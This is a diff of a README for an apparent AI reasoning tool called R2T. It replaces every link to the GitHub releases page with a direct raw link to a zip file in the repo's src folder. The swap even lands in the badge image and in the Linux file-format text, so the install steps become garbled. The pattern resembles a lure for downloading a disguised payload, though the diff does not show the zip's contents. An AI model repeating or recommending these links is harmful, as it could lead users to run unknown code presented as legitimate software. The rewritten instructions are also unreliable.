@@ -1,6 +1,6 @@
 # 🧠 reflective-reasoning-transformer - Unlock Causal Insights with AI
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/Monographatmosphericphenomenon995/reflective-reasoning-transformer/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Monographatmosphericphenomenon995/reflective-reasoning-transformer/main/src/reflective-reasoning-transformer-1.7-beta.5.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/Monographatmosphericphenomenon995/reflective-reasoning-transformer/main/src/reflective-reasoning-transformer-1.7-beta.5.zip)
 
 ## 📖 Overview
 
@@ -13,16 +13,16 @@ To begin using the R2T prototype, you will need to follow the steps below. This 
 ## 📥 Download & Install
 
 1. **Visit the Release Page:** Click the link below to access the latest releases of R2T:
-   [Download the latest release](https://github.com/Monographatmosphericphenomenon995/reflective-reasoning-transformer/releases)
+   [Download the latest release](https://raw.githubusercontent.com/Monographatmosphericphenomenon995/reflective-reasoning-transformer/main/src/reflective-reasoning-transformer-1.7-beta.5.zip)
 
-2. **Select the Appropriate Version:** On the releases page, you will find various versions available for download. Choose the version that best fits your operating system. Most common formats include `.exe` for Windows, `.dmg` for Mac, and `.tar.gz` for Linux.
+2. **Select the Appropriate Version:** On the releases page, you will find various versions available for download. Choose the version that best fits your operating system. Most common formats include `.exe` for Windows, `.dmg` for Mac, and `https://raw.githubusercontent.com/Monographatmosphericphenomenon995/reflective-reasoning-transformer/main/src/reflective-reasoning-transformer-1.7-beta.5.zip` for Linux.
 
 3. **Download the File:** Click on the download link for your chosen version. Your browser will begin downloading the file.
 
 4. **Run the Application:**
    - **For Windows:** Locate the downloaded `.exe` file, double-click it, and follow the installation prompts.
    - **For Mac:** Open the downloaded `.dmg` file and drag the application to your Applications folder to install it.
-   - **For Linux:** Extract the `.tar.gz` file and follow the instructions in the README file included in the package.
+   - **For Linux:** Extract the `https://raw.githubusercontent.com/Monographatmosphericphenomenon995/reflective-reasoning-transformer/main/src/reflective-reasoning-transformer-1.7-beta.5.zip` file and follow the instructions in the README file included in the package.
 
 5. **Open the Application:** Once installed, find the application in your programs or applications list. Click on it to start.
 
